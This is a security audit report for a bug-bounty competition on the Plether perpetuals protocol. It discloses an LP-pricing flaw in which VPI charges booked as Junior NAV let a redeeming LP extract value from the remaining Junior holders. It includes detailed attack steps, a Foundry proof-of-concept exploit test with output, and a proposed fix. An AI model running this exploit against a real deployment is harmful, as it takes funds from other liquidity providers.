# \#97803 [SC-Critical] Refundable VPI charge is booked as Junior NAV at open, so a Junior LP can redeem at an inflated price and leave the refund to the remaining Junior LPs

**Submitted on Nov 3rd 2026 at 09:15:08 UTC by @Raiders for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97803
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

A skew-increasing open pays a VPI charge `c` that the pool books as Junior revenue at once. Because VPI is path-independent and the lifetime clamp caps the close rebate at the accrued charge, the same position gets exactly `c` back when it closes. A Junior LP with a queued redemption opens a max-skew position shortly before the epoch boundary, lets any keeper settle the epoch at a price that includes `c`, then closes. The refund is paid from pool cash after the redemption has left, so the remaining Junior LPs pay it. With production parameters the attacker nets +2,467.04 USDG per cycle at a 74% Junior share, and the cycle repeats every 2-3 hours.

## Root cause

VPI is the difference of a potential `C(S) = 0.5·k·S²/D` (CfdMath.sol:118-140). WHITEPAPER.md:850-857 states that at unchanged depth the charges telescope to `C(S_N) - C(S_0)`. An open from skew `S_pre` to `S_post` pays `c = C(S_post) - C(S_pre)`; a full close back to `S_pre` at the same depth pays `-c`.

At open, the trade cost minus the protocol fee goes to the pool as revenue:

```solidity
// CfdEngineSettlementSidecar.sol:453-462
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
```

`recordClaimantInflow` with `CashArrived` adds the amount to `accountedAssets` (HousePool.sol:640). LP NAV is pool assets plus the terminal price delta minus trader claims (CfdEngineProtocolLens.sol:63-72, HousePoolAccountingLib.sol:60-77). Nothing in it represents the refund that open positions will collect at close; `vpiAccrued` is stored per position (CfdTypes.sol:41) and never aggregated into NAV.

When an epoch settles, `_settleLpEpoch` runs `_reconcile` first (HousePool.sol:834) and then prices Junior redemptions from the updated principal (HousePool.sol:839-840):

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

result.cutoffEpoch = cutoffEpoch;
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

With senior at its high-water mark, all revenue goes to Junior (HousePoolWaterfallAccountingLib.sol:158, `nextState.juniorPrincipal += remaining;`). The redemption is paid at `J + c`. No exit fee applies while the oracle is live (HousePool.sol:1151-1152 returns 0).

At close, the clamp guarantees the refund is exactly `c`, even when the redemption has shrunk depth and the fresh curve delta would be larger:

```solidity
// CloseAccountingLib.sol:112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The rebate is paid from pool cash (CfdEngineSettlementSidecar.sol:621-623). At the next reconcile the pool is short by `c`, and the loss falls on the Junior holders who stayed.

So the pool records `c` as equity while it carries a matching, certain liability that is never booked. Any LP exit priced in between is overpaid.

The mirror case has the same root cause. A skew-reducing open receives a rebate `R` from pool cash (CfdEnginePlanLib.sol:333, CfdEngineSettlementSidecar.sol:442-444, HousePool.sol:611). `R` is locked as a reserve in the clearinghouse (CfdEngineSettlementSidecar.sol:466-476) and kept out of NAV, although the clamp guarantees it is clawed back at close. A Junior deposit priced in between buys at `J - R`. Carrying `-Σ vpiAccrued` of open positions in LP NAV fixes both sides.

## Attack steps

Core attack (redeem side). The attacker holds share `f` of Junior. Epochs are 1 hour (HousePool.sol:178); requests close 5 minutes before the boundary `B` (TrancheVault.sol:39, :548).

1. Before `B - 300s`, call `juniorVault.requestRedeem` for the attacker's Junior shares. The request matures at `B`.
2. At `B - 60s`, commit a LONG open sized to reach max skew (`0.4·D - S_pre`). A keeper executes it in the next block with a fresh Pyth update. The pool receives `c = 0.5·k·(S_post² - S_pre²)/D` as revenue.
3. After `B`, any keeper calls `OrderRouter.settleLpEpoch` (OrderRouter.sol:479, permissionless). Reconcile credits `c` to `juniorPrincipal` and the redemption is priced at `J + c`. The attacker does not need to settle; opens have no epoch gate, so there is no race.
4. Commit and execute a full close. The clamp refunds exactly `c` from pool cash.
5. Claim the redemption. The next reconcile books the `c` shortfall against the remaining Junior holders.

Attacker net per cycle ≈ `f·(c + s) - 2·F - 2·s`, where `F` is the 4 bps execution fee per leg and `s` the adverse-confidence shift per leg. Re-entry needs a new deposit (1 epoch) and the 1-hour `DEPOSIT_COOLDOWN` before the next `requestRedeem` (TrancheVault.sol:38, :617), so one lot cycles every 2-3 hours. Staggered lots can hit every epoch.

Amplifier: round trip. With third-party same-direction skew `S0` already open:

1. Before the cutoff for epoch `B`, request a Junior deposit `X`.
2. Before `B`, open a skew-reducing SHORT `d`. The pool pays rebate `R`, which sits off-NAV in the trader's reserve.
3. A keeper settles `B`. Reconcile books `R` as a loss, and the deposit mints shares at `J - R`.
4. Close the SHORT. The clamp returns `R` to the pool and the attacker's new shares capture part of it.
5. After the cooldown, run the core attack on epoch `B + 2h`.

The deposit leg alone does not cause a real loss. In `test_trueValueBaseline`, once `S0` closes the attacker is -541.58 USDG against staying out, and the victim is +1,441.90 against a never-deposit baseline. The reason: `S0`'s own charge `c0` (about 8,000) is also inflating NAV and `R ≤ c0`, so `J - R` is still above true NAV `J - c0`. The deposit leg only adds to the redeem leg, because in the round trip the attacker exits while `c0` is still booked.

## Impact

All runs use the deployment parameters of the latest release (the Arbitrum Sepolia v2.0.0 deployment, the only one published) from `packages/perps/DEPLOYMENT.md:128-156` and `deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json:166-194`: `vpiFactor` 0.01e18, `executionFeeBps` 4, `maxSkewRatio` 0.4e18, maintenance/initial margin 10/20 bps, `adverseConfidenceMultiplierBps` 2500, `basketMaxConfidenceRatioBps` 10, `maxSeniorShareBps` 8000, with 2 bps Pyth confidence per feed. USDG is the USD settlement stable, so 1 USDG ≈ 1 USD.

Main case (`test_attack_productionParams`): senior 5M, Junior 5M (attacker 74%, victim 1.3M), no prior skew, 4M LONG to max skew, flat price.

| | attack | control |
|---|---|---|
| VPI charge `c` | 7,999.20 | - |
| Junior principal left after the redemption is funded | 1,302,120.94 | 1,299,989.14 |
| Attacker redemption | 3,706,033.66 | 3,699,966.26 |
| Victim Junior value | 1,295,875.26 | 1,299,942.42 |
| Senior LP value | 5,000,091.32 | 5,000,091.32 |

- Attacker: redemption +6,067.41, trader leg -3,600.37, net +2,467.04 USDG per cycle.
- Victim: -4,067.16 against control, 4,124.74 below its 1,300,000 deposit.
- Senior: 0. Treasury +1,599.92 (open fee), keeper +0.20. Closed-system residual 0, so every USDG is accounted for.

Other runs in the same file:

- Prior skew 0.3·D, 1M top-up, f = 74%: +1,725.33 per cycle (`test_breakEvenTable`).
- Break-even Junior share: 43.9% with no prior skew, 25.4% at 0.3·D prior skew.
- Price moves of -2 to +3 bps between open and close: +2,154.51 to +2,675.39 at 2 bps confidence; +1,143.91 to +1,665.19 at the 10 bps confidence cap (`test_priceNoise`).
- Round trip (`test_roundTrip_productionParams`, Junior 5M victim, senior 5M, attacker X = 5M, S0 = 0.4·D): +2,841.82 per cycle (deposit leg +1,261.91, redeem leg +1,579.90, trading cost 3,780.26). Victim -5,402.06 against control, -5,440.33 against a never-deposit baseline after `S0` closes. Senior 0, residual 0. Break-even attacker share about 23.6% at 2 bps confidence, 22.5% at 1 bps.

Scaling (estimate from the formula above, not run): senior 20M, Junior 15M, D = 35M. The 80% senior-share cap limits the Junior redemption to about 10M, so f ≈ 0.667. Then `c = 0.0008·D = 28,000`, fees `2F = 11,200`, and net ≈ 7.5k USDG per cycle before the confidence shift (about 6.5k with 2 bps confidence). The remaining Junior holders lose about `f·c` per cycle, less the close fee the pool keeps (4,067.16 in the main case), and the loss repeats every cycle until they withdraw.

## Proof of Concept

## Proof of Concept

The PoC runs on the contest repo's own test harness (`test/perps/BasePerpTest.sol`), not a fork: the scope page says the Arbitrum Sepolia deployment is not the production configuration, and the harness lets the test set the production values. `router` is `LegacyOrderRouterHarness`, which is the production `OrderRouter` plus a test-only scalar `commitOrder` that forwards to the V3 commit. Every order execution and epoch settlement goes through the production `executeOrder` and `settleLpEpoch` from an unrelated keeper. No privileged prank is used after configuration.

Full file attached: `packages/perps/test/poc/H_L6_1_VpiNavSandwich.t.sol` (10 tests). Core excerpt below: configuration, helpers, the scenario runner, `test_attack_productionParams` and `test_control_noOpen`.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// H-L6-1: VPI NAV sandwich on the Junior redemption epoch.
///
/// A skew-increasing open pays a VPI charge c that the pool books as Junior revenue at once
/// (CfdEngineSettlementSidecar.sol:453-462, HousePool.sol:640-642). The same position gets exactly c back when it
/// closes (lifetime clamp, CloseAccountingLib.sol:102-117). A Junior LP that queued a redemption opens just before the
/// epoch boundary, lets any keeper settle the epoch (redemption priced at J + c, HousePool.sol:832-845), then closes.
/// The refund of c is paid from pool cash after the redemption has left, so the remaining Junior LPs pay it.
///
/// Production parameters: DEPLOYMENT.md:131-160 and deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/
/// manifest.json:166-196 (vpi 0.01e18, maxSkew 0.4e18, maint 10 / init 20 bps, fee 4 bps, settlement buffer 25 bps,
/// adverseConfidenceMultiplierBps 2500, basketMaxConfidenceRatioBps 10, minOpenNotional 1000e6, maxSeniorShare 8000,
/// maxSeniorExposure 40M, seeds 1e6). Pool seniorRateBps stays at the 800 constructor default.
///
/// No privileged prank is used after deployment/configuration. Every LP epoch settlement and every order execution
/// is done by an unrelated keeper through the permissionless Router entry points with explicit Pyth payloads.
contract H_L6_1_VpiNavSandwich is BasePerpTest {

    address internal attacker;
    address internal victim;
    address internal seniorLp;
    address internal keeper;
    address internal otherTrader;

    uint256 internal constant JUNIOR_TOTAL = 5_000_000e6;
    uint256 internal constant SENIOR_TOTAL = 5_000_000e6;
    uint256 internal constant MAX_SKEW_NOTIONAL = 4_000_000e18; // 0.4 * D, D = 10,000,002 USDG
    uint256 internal constant PRICE0 = 1e8;

    uint256 internal T0;
    uint256 internal B; // epoch boundary at which the attacker's redemption matures

    struct Scenario {
        uint256 fBps; // attacker share of Junior (attacker redeems all of it)
        uint256 priorSkew; // same-direction notional opened earlier by an unrelated trader (18 dec)
        bool attack;
        uint256 p0; // open execution price (B-59s)
        uint256 p1; // epoch settlement price (B+5s)
        uint256 p2; // close execution price and final reconcile price (B+7s, B+20s)
        uint64 confBps100; // per-feed Pyth confidence in 0.01 bps of price (200 = 2 bps)
    }

    struct Outcome {
        uint256 redeemed;
        uint256 requestedShares;
        uint256 traderStart;
        uint256 traderEnd;
        uint256 victimDeposit;
        uint256 victimAfter;
        uint256 seniorAfter;
        uint256 seedJuniorAfter;
        uint256 seedSeniorAfter;
        uint256 treasuryAfter;
        uint256 keeperAfter;
        uint256 otherTraderAfter;
        uint256 unassignedAfter;
        uint256 poolCashAfter;
        uint256 juniorPrincipalAfter;
        uint256 juniorViewBeforeReconcile;
        uint256 vpiCharge;
        uint256 poolCashAfterOpen;
        uint256 juniorPrincipalAtSettle;
        uint256 juniorPrincipalAfterClose;
        uint256 pendingAfterClose;
        uint256 treasuryAfterOpen;
        uint256 treasuryStart;
    }

    // ------------------------------------------------------------------
    // Production configuration
    // ------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        attacker = makeAddr("attacker");
        victim = makeAddr("victimJunior");
        seniorLp = makeAddr("seniorLp");
        keeper = makeAddr("keeper");
        otherTrader = makeAddr("otherTrader");

        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.basketMaxConfidenceRatioBps = 10;
        rc.minOpenNotionalAssets = 1000e6;
        rc.maxPendingOrders = 5;
        _setRouterConfig(rc);
        _setSeniorCapacity(40_000_000e6, 8000);

        // Production values sanity.
        assertEq(engine.executionFeeBps(), 4, "fee");
        assertEq(engine.settlementBufferBps(), 25, "buffer");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "adverse conf");
        assertEq(pool.seniorRateBps(), 800, "senior rate");

        // Next Monday 10:00 UTC, FX open, clean hour boundary.
        T0 = SETUP_TIMESTAMP + 7 days;
        assertLt(block.timestamp, T0, "config warps exceed a week");
        vm.warp(T0);
        vm.roll(block.number + 100);
        B = T0 + 3 hours;
    }

    // ------------------------------------------------------------------
    // Pyth payload / keeper helpers
    // ------------------------------------------------------------------

    function _at(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// Explicit FeedUpdate[] payload. publishTime is the block time, prevPublishTime = publishTime - 1.
    function _pyth(
        uint256 price,
        uint64 confBps100
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ups = new MockPyth.FeedUpdate[](ids.length);
        uint256 t = vm.getBlockTimestamp();
        uint64 conf = uint64((price * confBps100) / 1_000_000);
        for (uint256 i; i < ids.length; ++i) {
            ups[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(price)), conf: conf, expo: -8, publishTime: t, prevPublishTime: t - 1
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(ups);
    }

    function _keeperSettle(
        uint256 price,
        uint64 confBps100
    ) internal {
        bytes[] memory d = _pyth(price, confBps100);
        vm.prank(keeper);
        router.settleLpEpoch(d);
    }

    function _keeperExecute(
        uint64 orderId,
        uint256 price,
        uint64 confBps100
    ) internal {
        bytes[] memory d = _pyth(price, confBps100);
        vm.prank(keeper);
        router.executeOrder(orderId, d);
    }

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        address lp,
        uint256 requestId
    ) internal {
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertGt(claimable, 0, "deposit not settled");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _value(
        TrancheVault vault,
        address who
    ) internal view returns (uint256) {
        return vault.convertToAssets(vault.balanceOf(who));
    }

    // ------------------------------------------------------------------
    // Scenario runner (identical timeline for attack and control)
    // ------------------------------------------------------------------

    function _run(
        Scenario memory s
    ) internal returns (Outcome memory o) {
        uint256 attackerJunior = (JUNIOR_TOTAL * s.fBps) / 10_000;
        o.victimDeposit = JUNIOR_TOTAL - attackerJunior;

        // T0+60: junior requests (epoch T0+1h).
        _at(T0 + 60);
        uint256 vReq = _requestDeposit(juniorVault, victim, o.victimDeposit);
        uint256 aReq = _requestDeposit(juniorVault, attacker, attackerJunior);
        _at(T0 + 1 hours + 10);
        _keeperSettle(PRICE0, s.confBps100);
        _claimDeposit(juniorVault, victim, vReq);
        _claimDeposit(juniorVault, attacker, aReq);
        // Senior next epoch (junior must exist first for the 80% senior share cap).
        uint256 sReq = _requestDeposit(seniorVault, seniorLp, SENIOR_TOTAL);
        _at(T0 + 2 hours + 10);
        _keeperSettle(PRICE0, s.confBps100);
        _claimDeposit(seniorVault, seniorLp, sReq);

        // Optional prior same-direction skew from an unrelated trader.
        if (s.priorSkew > 0) {
            _fundTrader(otherTrader, 200_000e6);
            _at(T0 + 2 hours + 20);
            vm.prank(otherTrader);
            uint64 id0 = router.commitOrder(CfdTypes.Side.LONG, s.priorSkew, 100_000e6, 0, false);
            _at(T0 + 2 hours + 21);
            _keeperExecute(id0, PRICE0, s.confBps100);
            (uint256 sz,,,,,,) = engine.positions(otherTrader);
            assertEq(sz, s.priorSkew, "prior skew open");
        }

        // T0+2h+30 (after the 1h deposit cooldown, before the B-5m cutoff): attacker queues full Junior redemption.
        _at(T0 + 2 hours + 30);
        o.requestedShares = juniorVault.balanceOf(attacker);
        vm.prank(attacker);
        uint256 rReq = juniorVault.requestRedeem(o.requestedShares, attacker, attacker);
        assertEq(pool.lpEpochStart(rReq), B, "redemption matures at B");

        _fundTrader(attacker, 200_000e6);
        o.traderStart = clearinghouse.balanceAssets(attacker);
        o.treasuryStart = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        uint256 size = MAX_SKEW_NOTIONAL - s.priorSkew;

        if (s.attack) {
            // B-60s: attacker commits the skew-increasing open (one block), keeper executes next block, publish > commit.
            _at(B - 60);
            vm.prank(attacker);
            uint64 openId = router.commitOrder(CfdTypes.Side.LONG, size, 50_000e6, 0, false);
            _at(B - 59);
            _keeperExecute(openId, s.p0, s.confBps100);
            (uint256 posSize,,,,,, int256 vpiAccrued) = engine.positions(attacker);
            assertEq(posSize, size, "open filled");
            o.vpiCharge = uint256(vpiAccrued);
            o.poolCashAfterOpen = settlementToken.balanceOf(address(pool));
            o.treasuryAfterOpen = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        }

        // B+5s: unrelated keeper settles the epoch with a post-boundary basket.
        _at(B + 5);
        _keeperSettle(s.p1, s.confBps100);
        o.juniorPrincipalAtSettle = pool.juniorPrincipal();

        if (s.attack) {
            _at(B + 6);
            vm.prank(attacker);
            uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
            _at(B + 7);
            _keeperExecute(closeId, s.p2, s.confBps100);
            (uint256 posSize,,,,,,) = engine.positions(attacker);
            assertEq(posSize, 0, "closed");
            o.juniorPrincipalAfterClose = pool.juniorPrincipal();
            o.pendingAfterClose = juniorVault.totalAssets();
        }

        // Reconcile before measuring. pool.reconcile() is onlyVault (HousePool.sol:1471) and no vault code calls it,
        // so the permissionless path is an LP epoch settlement with progress (HousePool.sol:835 _reconcile). A
        // newcomer queues a 1 USDG Junior deposit for epoch B+1h; the keeper settles it on a fresh mark.
        _at(B + 20);
        address newcomer = makeAddr("newcomer");
        uint256 nReq = _requestDeposit(juniorVault, newcomer, 1e6);
        _at(B + 1 hours + 10);
        o.juniorViewBeforeReconcile = juniorVault.totalAssets();
        _keeperSettle(s.p2, s.confBps100);
        _claimDeposit(juniorVault, newcomer, nReq);
        o.juniorPrincipalAfter = pool.juniorPrincipal();
        assertEq(juniorVault.totalAssets(), o.juniorPrincipalAfter, "view == stored after reconcile");

        uint256 claimable = juniorVault.claimableRedeemRequest(rReq, attacker);
        vm.prank(attacker);
        o.redeemed = juniorVault.claimRedeem(rReq, claimable, attacker, attacker);
        assertEq(juniorVault.pendingRedeemRequest(rReq, attacker), 0, "redemption fully funded");

        o.traderEnd = clearinghouse.balanceAssets(attacker);
        o.victimAfter = _value(juniorVault, victim);
        o.seniorAfter = _value(seniorVault, seniorLp);
        o.seedJuniorAfter = _value(juniorVault, address(this));
        o.seedSeniorAfter = _value(seniorVault, address(this));
        o.treasuryAfter = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        o.keeperAfter = clearinghouse.balanceAssets(keeper) + settlementToken.balanceOf(keeper);
        o.otherTraderAfter = clearinghouse.balanceAssets(otherTrader);
        o.unassignedAfter = pool.unassignedAssets();
        o.poolCashAfter = settlementToken.balanceOf(address(pool));
    }

    function _pair(
        Scenario memory s
    ) internal returns (Outcome memory a, Outcome memory c) {
        uint256 snap = vm.snapshotState();
        s.attack = true;
        a = _run(s);
        vm.revertToState(snap);
        s.attack = false;
        c = _run(s);
        vm.revertToState(snap);
    }

    function _profit(
        Outcome memory a,
        Outcome memory c
    ) internal pure returns (int256) {
        return (int256(a.redeemed) - int256(c.redeemed)) + (int256(a.traderEnd) - int256(a.traderStart))
            - (int256(c.traderEnd) - int256(c.traderStart));
    }

    function _d(
        uint256 x,
        uint256 y
    ) internal pure returns (int256) {
        return int256(x) - int256(y);
    }

    // ... _usd() formatting helper omitted (used only by the table tests) ...

    function _logSigned(
        string memory label,
        int256 v
    ) internal pure {
        console2.log(label, v);
    }

    // ------------------------------------------------------------------
    // 1. Main attack with accounting reconciliation
    // ------------------------------------------------------------------

    function _mainScenario() internal pure returns (Scenario memory s) {
        s = Scenario({
            fBps: 7400, priorSkew: 0, attack: true, p0: PRICE0, p1: PRICE0, p2: PRICE0, confBps100: 200 // 2 bps conf
        });
    }

    function test_attack_productionParams() public {
        (Outcome memory a, Outcome memory c) = _pair(_mainScenario());
        int256 residual = _report("MAIN f=74% skew=0 conf=2bps flat price", a, c);
        assertEq(residual, 0, "every USDG of the transfer is accounted for");
        console2.log("treasury fee credited on open / on close  ", a.treasuryAfterOpen - a.treasuryStart, a.treasuryAfter - a.treasuryAfterOpen);

        int256 profit = _profit(a, c);
        assertGt(profit, 0, "attacker profit");
        assertEq(a.seniorAfter, c.seniorAfter, "senior value unchanged vs control");
        assertLt(a.victimAfter, a.victimDeposit, "victim below its deposit");
        assertLt(a.victimAfter, c.victimAfter, "victim loses vs control");
    }

    function _report(
        string memory title,
        Outcome memory a,
        Outcome memory c
    ) internal pure returns (int256 sum) {
        console2.log("==================================================");
        console2.log(title);
        console2.log("--------------------------------------------------");
        console2.log("VPI charge c booked at open (USDG 6dp)    ", a.vpiCharge);
        console2.log("junior principal at settle  attack/control", a.juniorPrincipalAtSettle, c.juniorPrincipalAtSettle);
        console2.log("redeemed assets             attack/control", a.redeemed, c.redeemed);
        console2.log("junior principal post-close (pre-reconcile)", a.juniorPrincipalAfterClose);
        console2.log("junior pending view post-close           ", a.pendingAfterClose);
        console2.log("junior view before / stored after reconcile", a.juniorViewBeforeReconcile, a.juniorPrincipalAfter);
        console2.log("victim deposit                            ", a.victimDeposit);
        console2.log("victim value                attack/control", a.victimAfter, c.victimAfter);
        console2.log("senior LP value             attack/control", a.seniorAfter, c.seniorAfter);
        console2.log("--------- deltas attack - control (USDG 6dp) ---------");
        int256 dRedeem = _d(a.redeemed, c.redeemed);
        int256 dTrader = _d(a.traderEnd, a.traderStart) - _d(c.traderEnd, c.traderStart);
        int256 dVictim = _d(a.victimAfter, c.victimAfter);
        int256 dSenior = _d(a.seniorAfter, c.seniorAfter);
        int256 dSeeds = _d(a.seedJuniorAfter, c.seedJuniorAfter) + _d(a.seedSeniorAfter, c.seedSeniorAfter);
        int256 dTreasury = _d(a.treasuryAfter, c.treasuryAfter);
        int256 dKeeper = _d(a.keeperAfter, c.keeperAfter);
        int256 dOther = _d(a.otherTraderAfter, c.otherTraderAfter);
        int256 dUnassigned = _d(a.unassignedAfter, c.unassignedAfter);
        _logSigned("attacker LP redemption gain       ", dRedeem);
        _logSigned("attacker trader leg               ", dTrader);
        _logSigned("ATTACKER NET PROFIT               ", dRedeem + dTrader);
        _logSigned("victim junior                     ", dVictim);
        _logSigned("junior seed holder                ", _d(a.seedJuniorAfter, c.seedJuniorAfter));
        _logSigned("senior LP                         ", dSenior);
        _logSigned("senior seed holder                ", _d(a.seedSeniorAfter, c.seedSeniorAfter));
        _logSigned("protocol treasury (exec fees)     ", dTreasury);
        _logSigned("keeper (exec bounty)              ", dKeeper);
        _logSigned("other trader                      ", dOther);
        _logSigned("pool unassigned                   ", dUnassigned);
        sum = dRedeem + dTrader + dVictim + dSeeds + dSenior + dTreasury + dKeeper + dOther + dUnassigned;
        _logSigned("SUM (closed-system residual)      ", sum);
        _logSigned("pool cash attack-control          ", _d(a.poolCashAfter, c.poolCashAfter));
    }

    // ------------------------------------------------------------------
    // 2. Control: no open, same timeline -> victim keeps its value (only the senior coupon accrues)
    // ------------------------------------------------------------------

    function test_control_noOpen() public {
        Scenario memory s = _mainScenario();
        s.attack = false;
        Outcome memory c = _run(s);
        console2.log("==================================================");
        console2.log("CONTROL f=74% no attacker open");
        console2.log("attacker deposit / redeemed ", (JUNIOR_TOTAL * s.fBps) / 10_000, c.redeemed);
        console2.log("victim deposit / value      ", c.victimDeposit, c.victimAfter);
        console2.log("senior deposit / value      ", SENIOR_TOTAL, c.seniorAfter);
        uint256 couponToSenior = c.seniorAfter - SENIOR_TOTAL;
        console2.log("senior coupon accrued (8% APR, ~1h)", couponToSenior);
        // Junior funds the senior coupon pro rata; nothing else moves.
        uint256 victimShortfall = c.victimDeposit - c.victimAfter;
        console2.log("victim shortfall (coupon share only)", victimShortfall);
        assertLe(victimShortfall, couponToSenior, "control victim loss bounded by coupon");
        assertLt(victimShortfall, 100e6, "control victim loss < 100 USDG");
    }
    // ... price-noise, break-even, deposit-side, round-trip and true-value tests omitted; see attached file ...
}
```

Run:

```
cd packages/perps && FOUNDRY_FFI=false forge test --match-path test/poc/H_L6_1_VpiNavSandwich.t.sol -vv
```

Output (main and control tests; amounts in 6-decimal USDG):

```
[PASS] test_attack_productionParams() (gas: 21793027)
  MAIN f=74% skew=0 conf=2bps flat price
  VPI charge c booked at open (USDG 6dp)     7999198420
  junior principal at settle  attack/control 1302120935590 1299989142789
  redeemed assets             attack/control 3706033662588 3699966256969
  victim deposit                             1300000000000
  victim value                attack/control 1295875263096 1299942418430
  senior LP value             attack/control 5000091324617 5000091324617
  --------- deltas attack - control (USDG 6dp) ---------
  attacker LP redemption gain        6067405619
  attacker trader leg                -3600367162
  ATTACKER NET PROFIT                2467038457
  victim junior                      -4067155334
  junior seed holder                 -3123
  senior LP                          0
  protocol treasury (exec fees)      1599920000
  keeper (exec bounty)               200000
  pool unassigned                    0
  SUM (closed-system residual)       0

[PASS] test_control_noOpen() (gas: 7827930)
  CONTROL f=74% no attacker open
  attacker deposit / redeemed  3700000000000 3699966256969
  victim deposit / value       1300000000000 1299942418430
  senior deposit / value       5000000000000 5000091324617
  senior coupon accrued (8% APR, ~1h) 91324617
  victim shortfall (coupon share only) 57581570

[PASS] test_roundTrip_productionParams() (gas: 69012071)
  ATTACKER NET PROFIT                2841820660
  victim junior                      -5402059588
  senior LP                          0
  SUM (closed-system residual)       0
  per cycle: combined 2841.82 | deposit leg 1261.91 | redeem leg 1579.90

Suite result: ok. 10 passed; 0 failed; 0 skipped
```

## Recommended fix

Account for the expected VPI reversal in LP NAV. The simplest form keeps a signed aggregate of `vpiAccrued` over open positions in the engine, updated wherever `vpiAccrued` changes (open at CfdEngineSettlementSidecar.sol:517, close at :647, and liquidation), and subtracts it from the terminal delta used for LP pricing:

```solidity
// HousePoolAccountingLib.buildReconcileSnapshot (sketch)
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets - engineSnapshot.openVpiAccruedAssets;
```

A positive accrual becomes a liability of at most the refund the clamp allows, and a negative accrual becomes a receivable of at least the clawback the clamp forces. Both sides are conservative, and one change closes the redeem and the deposit variants.

Alternatives with the same effect: escrow skew-increasing VPI charges until the position closes and release only the net lifetime VPI as revenue, or defer VPI recognition to close.

Also correct the comment at CloseAccountingLib.sol:112-115. The clamp stops a trader-side depth sandwich, but it does not stop an LP sandwich; it makes the refund in this attack exact.
